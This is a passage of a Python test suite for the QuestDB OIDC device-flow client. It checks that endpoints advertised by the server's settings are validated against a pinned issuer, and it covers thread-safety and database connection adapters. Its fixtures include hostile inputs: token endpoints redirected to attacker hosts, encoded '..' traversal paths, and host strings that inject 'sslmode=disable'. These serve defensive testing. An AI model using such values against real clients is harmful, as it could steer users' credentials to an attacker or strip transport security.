            'token_endpoint': 'https://oauth2.idp.example/token',
            'device_authorization_endpoint': 'https://attacker.example/device',
        }
        with self.assertRaises(OidcConfigError) as cm:
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)
        self.assertIn('issuer', str(cm.exception).lower())

    def test_settings_both_endpoints_off_issuer_origin_rejected(self):
        # When /settings advertises BOTH credential endpoints off the issuer
        # origin, there is no IdP discovery round-trip to confirm them (both are
        # present), so they cannot be trusted on the untrusted /settings channel
        # -> reject. Pass them explicitly, or omit one so discovery confirms it.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://oauth2.idp.example/token',
            'acl.oidc.device.authorization.endpoint':
                'https://oauth2.idp.example/device',
        }}
        with self.assertRaises(OidcConfigError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_settings_endpoint_off_issuer_path_confirmed_by_discovery(self):
        # Regression: a path-bearing issuer (Azure-AD-style `.../{tenant}/v2.0`)
        # whose token endpoint sits OFF the issuer PATH but on its origin,
        # advertised by /settings and CONFIRMED verbatim by the IdP's own
        # (TLS-fetched) discovery document, must be ACCEPTED — the issuer-PATH
        # pin shares the same discovery-confirmation exemption as the issuer-
        # ORIGIN pin, and both now run AFTER discovery. The device endpoint is
        # absent from /settings, so it is discovered. Before the fix the PATH
        # check ran before discovery with no exemption and wrongly rejected this.
        from questdb.auth import _discovery
        issuer = 'https://idp.example.com/tenant/v2.0'
        settings = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            # off the issuer PATH (/tenant/v2.0), but on the issuer ORIGIN:
            'acl.oidc.token.endpoint':
                'https://idp.example.com/tenant/oauth2/v2.0/token'}
        well_known = {
            'issuer': issuer,
            'token_endpoint':
                'https://idp.example.com/tenant/oauth2/v2.0/token',
            'device_authorization_endpoint':
                'https://idp.example.com/tenant/oauth2/v2.0/devicecode'}
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(_discovery, 'discover_device_endpoint_from_idp',
                               return_value=well_known):
            cfg = _discovery.resolve_config(
                questdb_url='https://qdb.example.com:9000', issuer=issuer)
        self.assertEqual(cfg.token_endpoint,
                         'https://idp.example.com/tenant/oauth2/v2.0/token')
        self.assertEqual(cfg.device_authorization_endpoint,
                         'https://idp.example.com/tenant/oauth2/v2.0/devicecode')

    def test_settings_endpoint_off_issuer_path_not_confirmed_rejected(self):
        # The flip side: an off-issuer-PATH /settings token endpoint (a tampered
        # /settings steering credentials to a different realm on the same host)
        # that the IdP discovery document does NOT confirm stays REJECTED — the
        # exemption only lifts the pin for the exact URL the IdP itself advertised.
        from questdb.auth import _discovery
        issuer = 'https://idp.example.com/realms/prod'
        settings = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                'https://idp.example.com/realms/EVIL/token'}
        well_known = {
            'issuer': issuer,
            'token_endpoint':  # the IdP advertises a DIFFERENT token endpoint
                'https://idp.example.com/realms/prod/token',
            'device_authorization_endpoint':
                'https://idp.example.com/realms/prod/device'}
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(_discovery, 'discover_device_endpoint_from_idp',
                               return_value=well_known):
            with self.assertRaises(OidcConfigError) as cm:
                _discovery.resolve_config(
                    questdb_url='https://qdb.example.com:9000', issuer=issuer)
        self.assertIn('issuer', str(cm.exception).lower())

    def test_well_known_404_raises_oidc_error(self):
        # issuer pinned (so the IdP fallback is allowed), but the .well-known
        # document 404s: get_json maps the non-2xx to OidcError rather than a
        # silent miss that would later masquerade as a missing-endpoint error.
        # See M4.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token'}}
        self.state.well_known = None  # the handler returns 404 for /.well-known
        with self.assertRaises(OidcError):
            OidcDeviceAuth.from_questdb(self.base, issuer=self.base,
                                        insecure=True)

    def test_from_questdb_forwards_default_interval(self):
        # from_questdb(**opts) must accept default_interval (it previously
        # raised TypeError) and reach the auth.
        self.state.settings = {'config': {
            'acl.oidc.enabled': True,
            'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': self.base + '/token',
            'acl.oidc.device.authorization.endpoint': self.base + '/device'}}
        auth = OidcDeviceAuth.from_questdb(
            self.base, insecure=True, default_interval=9,
            renderer=Renderer(), interactive=True, _clock=FakeClock())
        self.assertEqual(auth._default_interval, 9)


class TestInsecureSettingsGuard(unittest.TestCase):
    """
    M1: a /settings response fetched over plaintext http to a non-loopback host
    (only reachable with insecure=True) is MITM-able, so IdP endpoints it
    advertises must not be trusted to route the device code / refresh token
    without an out-of-band issuer pin — even when BOTH endpoints are present (so
    the co-location check would otherwise pass trivially).
    """

    _TAMPERED = {
        'acl.oidc.enabled': True,
        'acl.oidc.client.id': 'questdb',
        'acl.oidc.token.endpoint': 'https://evil.example.com/token',
        'acl.oidc.device.authorization.endpoint':
            'https://evil.example.com/device',
    }

    def _resolve(self, settings, **kw):
        # Stub the network: /settings returns the given (possibly tampered) map,
        # and IdP discovery must never be contacted in these guard paths.
        from questdb.auth import _discovery
        with mock.patch.object(_discovery, 'fetch_settings',
                               return_value=settings), \
             mock.patch.object(
                 _discovery, 'discover_device_endpoint_from_idp',
                 side_effect=AssertionError('IdP discovery must not run')):
            return _discovery.resolve_config(**kw)

    def test_both_endpoints_over_plaintext_without_pin_rejected(self):
        # The M1 case: both endpoints present at one (attacker) origin, plaintext
        # channel, no pin -> refuse, and never contact the IdP.
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(self._TAMPERED,
                          questdb_url='http://qdb.internal.example:9000',
                          insecure=True)
        self.assertIn('issuer', str(cm.exception))

    def test_plaintext_guard_does_not_fire_for_loopback(self):
        # Loopback http never leaves the host, so /settings is not MITM-able;
        # the guard must not fire (the common local-dev path).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://127.0.0.1:9000', insecure=True)
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')

    def test_plaintext_guard_does_not_fire_over_https(self):
        # Over https /settings is authenticated by TLS; the documented
        # trust-the-server behavior is preserved (issuer= stays optional).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='https://qdb.example.com:9000')
        self.assertEqual(cfg.device_authorization_endpoint,
                         'https://evil.example.com/device')

    def test_explicit_endpoints_over_plaintext_are_trusted(self):
        # Endpoints the caller passed explicitly are not /settings-supplied, so
        # the guard must not force a pin even over a plaintext channel.
        cfg = self._resolve(
            {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'},
            questdb_url='http://qdb.internal.example:9000', insecure=True,
            token_endpoint='https://idp.example.com/token',
            device_authorization_endpoint='https://idp.example.com/device')
        self.assertEqual(cfg.token_endpoint, 'https://idp.example.com/token')

    def test_pin_satisfies_guard_over_plaintext(self):
        # With an out-of-band issuer pin the guard is satisfied (the actual
        # origin validation then happens in OidcDeviceAuth.__init__).
        cfg = self._resolve(self._TAMPERED,
                            questdb_url='http://qdb.internal.example:9000',
                            insecure=True, issuer='https://evil.example.com')
        self.assertEqual(cfg.token_endpoint, 'https://evil.example.com/token')

    def test_issuer_path_scopes_settings_endpoints(self):
        # M1: a tampered /settings advertising a DIFFERENT realm's endpoints on
        # the SAME host (Keycloak path-based multi-tenancy) is rejected when the
        # issuer is pinned to a specific realm — the origin check alone can't
        # catch it because both realms share one origin.
        kc = 'https://idp.example.com/realms'
        evil = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                kc + '/EVIL/protocol/openid-connect/token',
            'acl.oidc.device.authorization.endpoint':
                kc + '/EVIL/protocol/openid-connect/auth/device'}
        with self.assertRaises(OidcConfigError) as cm:
            self._resolve(evil, questdb_url='https://qdb.example.com:9000',
                          issuer=kc + '/prod')
        self.assertIn('issuer', str(cm.exception).lower())
        # The pinned realm's own endpoints are accepted.
        good = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint':
                kc + '/prod/protocol/openid-connect/token',
            'acl.oidc.device.authorization.endpoint':
                kc + '/prod/protocol/openid-connect/auth/device'}
        cfg = self._resolve(good, questdb_url='https://qdb.example.com:9000',
                            issuer=kc + '/prod')
        self.assertEqual(cfg.token_endpoint,
                         kc + '/prod/protocol/openid-connect/token')

    def test_issuer_path_scope_skips_explicit_endpoints(self):
        # Caller-explicit endpoints are trusted and NOT path-checked, so an IdP
        # that places endpoints outside the issuer path (e.g. Azure AD) still
        # works when the endpoints are passed explicitly.
        cfg = self._resolve(
            {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'},
            questdb_url='https://qdb.example.com:9000',
            issuer='https://idp.example.com/realms/prod',
            token_endpoint='https://idp.example.com/oauth2/v2.0/token',
            device_authorization_endpoint=(
                'https://idp.example.com/oauth2/v2.0/devicecode'))
        self.assertEqual(cfg.token_endpoint,
                         'https://idp.example.com/oauth2/v2.0/token')

    def test_issuer_path_scope_rejects_dot_segment_traversal(self):
        # A tampered /settings can't slip a different realm past the issuer-path
        # scope with a '..' segment: '/realms/prod/../EVIL/...' satisfies a naive
        # prefix test but the IdP normalizes it to the EVIL realm. The dotted
        # path must be rejected (even percent-encoded). See
        # _endpoint_path_under_issuer.
        kc = 'https://idp.example.com/realms'
        for ep in (kc + '/prod/../EVIL/protocol/openid-connect',
                   kc + '/prod/%2e%2e/EVIL/protocol/openid-connect',
                   # double-encoded: a server that unescapes twice resolves the
                   # '..' the old single-decode check missed (M4).
                   kc + '/prod/%252e%252e/EVIL/protocol/openid-connect'):
            evil = {
                'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
                'acl.oidc.token.endpoint': ep + '/token',
                'acl.oidc.device.authorization.endpoint': ep + '/auth/device'}
            with self.assertRaises(OidcConfigError) as cm:
                self._resolve(evil, questdb_url='https://qdb.example.com:9000',
                              issuer=kc + '/prod')
            self.assertIn('issuer', str(cm.exception).lower())


class TestConcurrency(AuthTestBase):
    def test_valid_cached_token_does_not_block_during_signin(self):
        # A caller with a valid cached token must NOT block behind another
        # thread's in-progress sign-in: the fast path takes no lock.
        auth = self.make_auth()
        valid = TokenSet(
            access_token='a', id_token=ID_TOKEN, refresh_token='r',
            expires_at=self._clock.now() + 3600)
        auth._cache.store(auth.cache_key, valid)

        auth._lock.acquire()  # simulate another thread mid-sign-in
        try:
            result = {}
            t = threading.Thread(
                target=lambda: result.update(tok=auth.token()))
            t.start()
            t.join(timeout=5)
            self.assertFalse(
                t.is_alive(), 'token() blocked behind an in-progress sign-in')
            self.assertEqual(result.get('tok'), ID_TOKEN)
        finally:
            auth._lock.release()

    def test_concurrent_signin_prompts_only_once(self):
        # Two threads racing with an empty cache must trigger exactly ONE
        # device flow; the loser reuses the winner's token.
        auth = self.make_auth()
        entered = threading.Event()
        release = threading.Event()

        class GatingRenderer(Renderer):
            def on_prompt(self, resp):
                entered.set()       # first thread is now inside the flow
                release.wait(5)     # ...holding the acquisition lock

        auth._renderer = GatingRenderer()
        results = {}

        def call(name):
            try:
                results[name] = auth.token()
            except Exception as e:  # noqa: BLE001
                results[name] = e

        t1 = threading.Thread(target=call, args=('a',))
        t1.start()
        self.assertTrue(entered.wait(5))   # t1 holds the lock in the flow
        t2 = threading.Thread(target=call, args=('b',))
        t2.start()
        release.set()                      # let t1 finish signing in
        t1.join(5)
        t2.join(5)
        # Fail loudly on a deadlock regression: a hung thread would otherwise
        # leak and let the assertions below pass on a stale/half-filled dict.
        self.assertFalse(t1.is_alive(), 'sign-in thread deadlocked')
        self.assertFalse(t2.is_alive(), 'waiter thread deadlocked')
        self.assertEqual(results.get('a'), ID_TOKEN)
        self.assertEqual(results.get('b'), ID_TOKEN)
        self.assertEqual(self.state.device_requests, 1)  # no second prompt

    def test_fast_path_does_not_write_tokens_field(self):
        # M4: the lock-free fast path must be READ-ONLY. Serving a valid token
        # from the shared cache must not write self._tokens — only the locked
        # slow path (and _store/clear) write it — so the lock-free reader can't
        # race a concurrent write (lost update / clear() resurrection).
        auth = self.make_auth()
        valid = TokenSet(access_token='a', id_token=ID_TOKEN, refresh_token='r',
                         expires_at=self._clock.now() + 3600)
        auth._cache.store(auth.cache_key, valid)
        self.assertIsNone(auth._tokens)            # nothing published yet
        self.assertEqual(auth.token(), ID_TOKEN)   # served via the fast path
        self.assertIsNone(auth._tokens)            # fast path did not write it

    def test_clear_on_other_instance_survives_inflight_acquire(self):
        # Two OidcDeviceAuth instances share the process-global MemoryCache
        # (same cache_key) but have separate per-instance locks. If instance B
        # clears the entry while instance A's sign-in is in flight, A's store
        # must NOT resurrect it: the per-key generation A captured before its
        # round-trip no longer matches, so the write is dropped and the cache
        # stays cleared (the next fresh load re-prompts, honoring clear()). A
        # still returns the token it just acquired. See store_if_current.
        a = self.make_auth()
        b = self.make_auth()
        self.assertEqual(a.cache_key, b.cache_key)

        class _ClearMidFlow(Renderer):
            def on_prompt(self, resp):
                b.clear()                 # concurrent clear during A's sign-in

        a._renderer = _ClearMidFlow()
        self.assertEqual(a.token(), ID_TOKEN)          # A still gets its token
        # A's store was dropped, so the shared cache is NOT repopulated; a fresh
        # instance therefore re-signs in rather than reusing the cleared token.
        self.assertNotIn(a.cache_key, _MEMORY_STORE)

    def test_store_if_current_drops_write_after_concurrent_clear(self):
        # Unit cover for the CAS primitive the cross-instance guard relies on:
        # a generation captured before a clear() must not be allowed to store.
        cache = MemoryCache()
        key = 'k'
        gen = cache.generation(key)                    # captured before clear
        cache.clear(key)                               # concurrent clear
        self.assertFalse(
            cache.store_if_current(key, TokenSet(access_token='T1'), gen))
        self.assertIsNone(cache.load(key))             # write dropped
        gen2 = cache.generation(key)                   # unraced store succeeds
        self.assertTrue(
            cache.store_if_current(key, TokenSet(access_token='T2'), gen2))
        self.assertIsNotNone(cache.load(key))

    def test_generation_pruned_when_no_acquisition_in_flight(self):
        # M8: the per-key clear()-generation must not accumulate forever. After a
        # clear() and a completed re-acquisition (no acquisition left in flight),
        # neither the generation nor the in-flight bookkeeping is retained for
        # the key, so the process-global maps stay bounded.
        auth = self.make_auth()
        auth.token()                 # sign in (slow path: capture + release)
        self.assertNotIn(auth.cache_key, _MEMORY_INFLIGHT)   # released
        auth.clear()                 # no acquisition in flight -> drop, no bump
        self.assertNotIn(auth.cache_key, _MEMORY_GENERATION)
        auth.token()                 # re-acquire; release() prunes on completion
        self.assertNotIn(auth.cache_key, _MEMORY_GENERATION)
        self.assertNotIn(auth.cache_key, _MEMORY_INFLIGHT)

    def test_concurrent_clear_retains_generation_until_acquire_done(self):
        # The flip side of pruning: while an acquisition IS in flight, a
        # concurrent clear() must RETAIN the bumped generation so the in-flight
        # store_if_current is still dropped (clear() honored). The entry is
        # reclaimed only once that acquisition releases — pruning must not weaken
        # this in-flight defense. Strengthens the cross-instance clear() test.
        seen = {}
        a = self.make_auth()
        b = self.make_auth()
        self.assertEqual(a.cache_key, b.cache_key)

        class _ClearMidFlow(Renderer):
            def on_prompt(self, resp):
                b.clear()  # concurrent clear during A's in-flight sign-in
                # A is mid-acquisition, so the generation is retained here.
                seen['gen_present'] = a.cache_key in _MEMORY_GENERATION
                seen['inflight'] = _MEMORY_INFLIGHT.get(a.cache_key, 0)

        a._renderer = _ClearMidFlow()
        self.assertEqual(a.token(), ID_TOKEN)
        self.assertTrue(seen['gen_present'])             # retained during the flow
        self.assertGreaterEqual(seen['inflight'], 1)
        self.assertNotIn(a.cache_key, _MEMORY_STORE)        # A's store dropped
        self.assertNotIn(a.cache_key, _MEMORY_GENERATION)   # reclaimed on release
        self.assertNotIn(a.cache_key, _MEMORY_INFLIGHT)

    def test_token_clear_stress(self):
        # M3: drive the lock-free fast path and the generation/inflight CAS under
        # REAL thread contention. The other concurrency tests exercise the CAS
        # sequentially or via a same-thread synchronous clear(); this races many
        # token() readers against a thread that periodically clear()s, the closest
        # analogue to a SQLAlchemy/psycopg pool opening connections as the token is
        # cycled. Asserts: no thread sees an exception (torn read / CAS bug / the
        # M1 non-string crash would surface here), none deadlocks, the cache keeps
        # serving so prompts stay far below the token() call count, and the
        # process-global in-flight bookkeeping doesn't leak.
        #
        # Runs on a free-threaded (no-GIL) build too — that is where the lock-free
        # fast-path read of self._tokens is genuinely concurrent with the locked
        # writers, so the _ConcurrentClock (not the racy FakeClock) is used.
        clock = _ConcurrentClock()
        auth = self.make_auth(clock=clock, open_browser=False)
        # Seed a valid token so the steady state is the lock-free fast path; a
        # device flow then runs ONLY when a clear() has just emptied the cache.
        seed = TokenSet(
            access_token='a', id_token=ID_TOKEN, refresh_token='r',
            issued_at=clock.now(), expires_at=clock.now() + 3600)
        auth._cache.store(auth.cache_key, seed)

        n_workers = 7
        iters = 200
        n_clears = 40
        errors = []
        start = threading.Barrier(n_workers + 1 + 1)  # workers + clearer + main

        def worker():
            start.wait()
            try:
                for _ in range(iters):
                    if auth.token() != ID_TOKEN:
                        errors.append('wrong token kind served')
                        return
            except Exception as e:  # noqa: BLE001
                errors.append(e)

        def clearer():
            start.wait()
            try:
                for _ in range(n_clears):
                    auth.clear()
            except Exception as e:  # noqa: BLE001
                errors.append(e)

        threads = [threading.Thread(target=worker) for _ in range(n_workers)]
        threads.append(threading.Thread(target=clearer))
        for t in threads:
            t.start()
        start.wait()  # release everyone at once for maximum contention
        for t in threads:
            t.join(30)
        for t in threads:
            self.assertFalse(t.is_alive(), 'a thread deadlocked under contention')
        self.assertEqual(errors, [], f'errors under contention: {errors[:3]}')
        # A device flow runs only after a clear() empties the cache (the lock
        # serializes the re-acquisition, so racing readers reuse it) — never per
        # call. So prompts are bounded by the clears, far below n_workers*iters.
        self.assertLessEqual(self.state.device_requests, n_clears + 1)
        self.assertGreater(n_workers * iters,
                           max(1, self.state.device_requests) * 10)
        # No leaked in-flight bookkeeping once the storm settles.
        self.assertEqual(_MEMORY_INFLIGHT.get(auth.cache_key, 0), 0)
        # The auth is still usable afterwards.
        self.assertEqual(auth.token(), ID_TOKEN)


class TestAdapters(unittest.TestCase):
    """PG-wire connection adapters: tested via injected fake modules (the real
    sqlalchemy / psycopg need not be installed)."""

    def test_psycopg_connect_as_sso_with_token(self):
        auth = _FakeAuth('TKN')
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            conn = psycopg_connect(
                auth, 'http://db.example.com:9000', connect_timeout=3)
        self.assertEqual(conn, 'CONN')
        self.assertEqual(captured['user'], '_sso')
        self.assertEqual(captured['password'], 'TKN')
        self.assertEqual(captured['host'], 'db.example.com')
        self.assertEqual(captured['port'], 8812)
        self.assertEqual(captured['dbname'], 'qdb')
        self.assertEqual(captured['connect_timeout'], 3)
        # The token is fetched at connect time (fresh per connection).
        self.assertEqual(auth.calls, 1)

    def test_psycopg_connect_uses_bare_ipv6_host(self):
        # psycopg takes host and port separately, so the IPv6 host is passed
        # WITHOUT brackets.
        captured = {}
        fake = types.ModuleType('psycopg')

        def connect(**kw):
            captured.update(kw)
            return 'CONN'

        fake.connect = connect
        with mock.patch.dict(sys.modules, {'psycopg': fake}):
            psycopg_connect(_FakeAuth(), 'http://[::1]:9000')
        self.assertEqual(captured['host'], '::1')

    def test_sqlalchemy_engine_injects_fresh_token_per_connect(self):
        auth = _FakeAuth('TKN')
        created = {}
        events = {}
        engine_obj = object()

        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []

        def create_engine(url, **kw):
            created.update(url=url, engine_kw=kw)
            return engine_obj

        class _Event:
            @staticmethod
            def listens_for(target, name):
                def deco(fn):
                    events.update(name=name, fn=fn)
                    return fn
                return deco

        fake_sa.create_engine = create_engine
        fake_sa.event = _Event

        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                created.update(kw)
                return 'URL'

        fake_eng.URL = _URL
        fake_pg = types.ModuleType('psycopg')  # drives the drivername choice

        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': fake_pg}):
            engine = sqlalchemy_engine(
                auth, 'http://db.example.com:9000', pool_pre_ping=True)

        self.assertIs(engine, engine_obj)
        self.assertEqual(created['drivername'], 'postgresql+psycopg')
        self.assertEqual(created['username'], '_sso')
        self.assertEqual(created['host'], 'db.example.com')
        self.assertEqual(created['port'], 8812)
        self.assertEqual(created['database'], 'qdb')
        self.assertEqual(created['url'], 'URL')
        self.assertEqual(created['engine_kw'], {'pool_pre_ping': True})
        self.assertEqual(events['name'], 'do_connect')
        # The listener injects a fresh token on each new connection.
        before = auth.calls
        for _ in range(2):
            cparams = {}
            events['fn'](None, None, [], cparams)
            self.assertEqual(cparams['password'], 'TKN')
        self.assertEqual(auth.calls - before, 2)

    def test_sqlalchemy_engine_uses_psycopg2_drivername(self):
        # When only psycopg2 (v2) is importable, the SQLAlchemy driver name is
        # postgresql+psycopg2, not +psycopg (the v3 branch).
        created = {}
        fake_sa = types.ModuleType('sqlalchemy')
        fake_sa.__path__ = []
        fake_sa.create_engine = lambda url, **kw: object()

        class _Event:
            @staticmethod
            def listens_for(target, name):
                return lambda fn: fn

        fake_sa.event = _Event
        fake_eng = types.ModuleType('sqlalchemy.engine')

        class _URL:
            @staticmethod
            def create(**kw):
                created.update(kw)
                return 'URL'

        fake_eng.URL = _URL
        fake_pg2 = types.ModuleType('psycopg2')

        with mock.patch.dict(sys.modules, {
                'sqlalchemy': fake_sa,
                'sqlalchemy.engine': fake_eng,
                'psycopg': None,        # force the psycopg2 fallback in _pg_module
                'psycopg2': fake_pg2}):
            sqlalchemy_engine(_FakeAuth(), 'http://db.example.com:9000')
        self.assertEqual(created['drivername'], 'postgresql+psycopg2')

    def test_require_host_rejects_hostless_url(self):
        # A URL with no extractable host must raise, not pass None to a driver;
        # an explicit host= override still resolves.
        for bad in ('localhost', 'questdb:9000'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    _require_host(bad)
        self.assertEqual(_require_host('localhost', 'h.example'), 'h.example')

    def test_require_host_malformed_port_raises_config_error(self):
        # A QuestDB URL with a non-integer port must raise OidcConfigError (via
        # safe_urlparse), not a bare ValueError.
        with self.assertRaises(OidcConfigError):
            _require_host('https://questdb.example.com:notaport')

    def test_require_host_with_conf_metachars_rejected(self):
        # A host containing connection-string delimiters (';' / '=') or
        # whitespace must be rejected, never spliced into PG connection
        # parameters (psycopg builds a libpq conninfo string from its kwargs).
        # urlparse() keeps ';'/'=' in .hostname.
        for bad in ('https://realhost;sslmode=disable;x=', 'https://a=b'):
            with self.subTest(url=bad):
                with self.assertRaises(OidcConfigError):
                    _require_host(bad)
        # An explicit host= override goes through the same guard: whitespace
        # (never valid in a host) and an IPv6 zone-id '%' (meaningful only for a
        # link-local address on the local machine, never a remote QuestDB) are
        # rejected too, keeping the guard a strict plain-host allowlist.
        for bad_host in ('evil;sslmode=disable', 'a=b', 'h ost', 'fe80::1%eth0'):
            with self.subTest(host=bad_host):
                with self.assertRaises(OidcConfigError):
                    _require_host('https://db.example.com:9000', bad_host)
        # A legitimate host (incl. an IPv6 literal, which contains ':') is
        # still accepted — the guard must not over-reject.
        self.assertEqual(
            _require_host('https://db.example.com:9000', '::1'), '::1')
        self.assertEqual(
            _require_host('https://db.example.com:9000', 'questdb.example.com'),
            'questdb.example.com')

    @unittest.skipIf(importlib.util.find_spec('sqlalchemy') is not None,
                     'sqlalchemy installed')
    def test_sqlalchemy_engine_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            sqlalchemy_engine(_FakeAuth(), 'https://db.example.com:9000')

    @unittest.skipIf(_HAS_PG_DRIVER, 'a PostgreSQL driver is installed')
    def test_psycopg_missing_dep_raises(self):
        with self.assertRaises(ImportError):
            psycopg_connect(_FakeAuth(), 'https://db.example.com:9000')

    @unittest.skipIf(_HAS_PG_DRIVER, 'a PostgreSQL driver is installed')
    def test_pg_module_missing_chains_cause(self):
        # The "no PG driver" ImportError chains the underlying import failure
        # (raise ... from e) so the traceback preserves the real cause.
        from questdb.auth._adapters import _pg_module
        with self.assertRaises(ImportError) as cm:
            _pg_module()
        self.assertIsInstance(cm.exception.__cause__, ImportError)


class TestConfigHelpers(unittest.TestCase):
    def test_as_bool_variants(self):
        from questdb.auth._discovery import _as_bool
        for v in ('true', 'True', '1', 'yes', 'on', True, 1):
            self.assertIs(_as_bool(v), True)
        for v in ('false', '0', 'no', 'off', '', False, 0):
            self.assertIs(_as_bool(v), False)
        self.assertIsNone(_as_bool(None))
        self.assertIs(_as_bool(None, default=True), True)
        # A non-0/1 number coerces via bool(); an unrecognized string / type
        # falls back to the default rather than guessing True/False.
        self.assertIs(_as_bool(2), True)
        self.assertIs(_as_bool(0.0), False)
        self.assertIsNone(_as_bool('maybe'))
        self.assertIs(_as_bool('maybe', default=False), False)

    def test_resolve_endpoint_accepts_only_absolute_url(self):
        # Matching the Java client, a /settings endpoint is trusted only as a
        # complete http(s) URL. A path-only value is NOT assembled from
        # acl.oidc.host / port / tls.enabled (no longer read) — it reads as
        # absent so resolution falls back to .well-known discovery.
        from questdb.auth._discovery import _resolve_endpoint
        self.assertEqual(_resolve_endpoint('https://idp/x'), 'https://idp/x')
        self.assertEqual(_resolve_endpoint('http://idp:9000/x'),
                         'http://idp:9000/x')
        self.assertIsNone(_resolve_endpoint('/as/token.oauth2'))
        self.assertIsNone(_resolve_endpoint(''))
        self.assertIsNone(_resolve_endpoint('//idp/x'))     # scheme-relative
        self.assertIsNone(_resolve_endpoint('ftp://idp/x'))  # non-http scheme

    def test_resolve_endpoint_ignores_non_string(self):
        # A non-string endpoint from /settings (e.g. a JSON number) must be
        # treated as absent, not raise AttributeError from .startswith(). M3.
        from questdb.auth._discovery import _resolve_endpoint
        self.assertIsNone(_resolve_endpoint(8080))
        self.assertIsNone(_resolve_endpoint(True))

    def test_str_setting_ignores_non_string(self):
        # A non-empty string passes through; anything else (a JSON list /
        # number / dict, None, empty string) reads as absent so it can't reach
        # scope.split() / the cache-key join as a raw object.
        from questdb.auth._discovery import _str_setting
        self.assertEqual(_str_setting('openid email'), 'openid email')
        for bad in (['openid'], 12345, {'x': 1}, True, '', None):
            self.assertIsNone(_str_setting(bad))

    def test_non_string_settings_do_not_crash_resolution(self):
        # A buggy/tampered /settings advertising non-string acl.oidc.* values
        # must stay within the typed-error contract instead of crashing later
        # with a bare AttributeError / TypeError (scope.split() / the cache-key
        # join). scope falls back to 'openid', audience drops to None, and a
        # non-string client.id reads as absent -> clear OidcConfigError.
        from questdb.auth import _discovery
        base = {
            'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb',
            'acl.oidc.token.endpoint': 'https://idp.example.com/token',
            'acl.oidc.device.authorization.endpoint':
                'https://idp.example.com/device'}

        def from_settings(settings):
            with mock.patch.object(_discovery, 'fetch_settings',
                                   return_value=settings):
                return OidcDeviceAuth.from_questdb(
                    'https://qdb.example.com:9000', renderer=Renderer())

        auth = from_settings({**base, 'acl.oidc.scope': ['openid', 'groups'],
                              'acl.oidc.audience': {'x': 1}})
        self.assertEqual(auth.config.scope, 'openid')   # non-string -> default
        self.assertIsNone(auth.config.audience)         # non-string -> dropped
        self.assertTrue(auth.cache_key)                 # crash site now safe
        # A non-string client.id reads as absent -> clear typed error.
        with self.assertRaises(OidcConfigError):
            from_settings({**base, 'acl.oidc.client.id': 12345})

    def test_non_string_idp_discovery_values_do_not_crash(self):
        # The IdP .well-known discovery document is untrusted too: a non-string
        # endpoint / issuer (a JSON number/list from a buggy or hostile IdP)
        # must read as absent -> a clear OidcConfigError, not a bare
        # AttributeError from safe_urlparse later. See resolve_config discovery.
        from questdb.auth import _discovery
        settings = {'acl.oidc.enabled': True, 'acl.oidc.client.id': 'questdb'}

        def from_discovery(well_known, **kw):
            with mock.patch.object(_discovery, 'fetch_settings',
                                   return_value=settings), \
                 mock.patch.object(
                     _discovery, 'discover_device_endpoint_from_idp',
                     return_value=well_known):
                return OidcDeviceAuth.from_questdb(
                    'https://qdb.example.com:9000', renderer=Renderer(), **kw)

        # Non-string token / device endpoint -> absent -> clear typed error.
        with self.assertRaises(OidcConfigError):
            from_discovery(
                {'device_authorization_endpoint': 'https://idp.example.com/device',
                 'token_endpoint': 12345},
                issuer='https://idp.example.com')
        with self.assertRaises(OidcConfigError):
            from_discovery(
                {'device_authorization_endpoint': ['nope'],
                 'token_endpoint': 'https://idp.example.com/token'},
                issuer='https://idp.example.com')
        # Valid discovered endpoints still resolve and the cache key builds
        # (the former non-string-field crash site).
        auth = from_discovery(
            {'device_authorization_endpoint': 'https://idp.example.com/device',
             'token_endpoint': 'https://idp.example.com/token'},
            issuer='https://idp.example.com')
        self.assertEqual(auth.config.issuer, 'https://idp.example.com')
        self.assertTrue(auth.cache_key)

    def test_settings_config_nesting(self):
        from questdb.auth._discovery import settings_config
        self.assertEqual(settings_config({'config': {'a': 1}}), {'a': 1})
        self.assertEqual(settings_config({'a': 1}), {'a': 1})  # flat fallback

    def test_settings_url_drops_query_and_fragment(self):
        # M9: the /settings endpoint is built on the QuestDB base URL's PATH,
        # dropping any query/fragment, so a base carrying one can't yield a
        # malformed ".../?x=1/settings". A trailing slash doesn't double up.
        from questdb.auth._discovery import _settings_url
        self.assertEqual(_settings_url('https://h:9000'),
                         'https://h:9000/settings')
        self.assertEqual(_settings_url('https://h:9000/'),
                         'https://h:9000/settings')
        self.assertEqual(_settings_url('https://h:9000/qdb'),
                         'https://h:9000/qdb/settings')
        self.assertEqual(_settings_url('https://h:9000/?x=1'),
